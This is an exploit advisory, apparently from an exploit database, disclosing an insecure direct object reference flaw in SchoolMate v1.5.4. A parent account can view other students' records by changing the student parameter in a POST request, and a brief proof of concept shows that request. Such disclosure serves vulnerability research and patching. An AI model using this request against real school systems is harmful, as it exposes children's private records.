# Exploit Title: SchoolMate v1.5.4 - Insecure Direct Object Reference(IDOR)
## Date: 4/1/2024
## Vendor Homepage: https://sourceforge.net/projects/schoolmate/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SchoolMate
## Version: v1.5.4
## Exploit Description:
## SchoolMate v1.5.4 suffers from IDOR - Broken Access Control Vulnerability allowing attacker parent to look up information of other student who is not his child(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /index.php HTTP/1.1
...

student=1(CHANGE HERE)&page2=5&logout=&page=5
```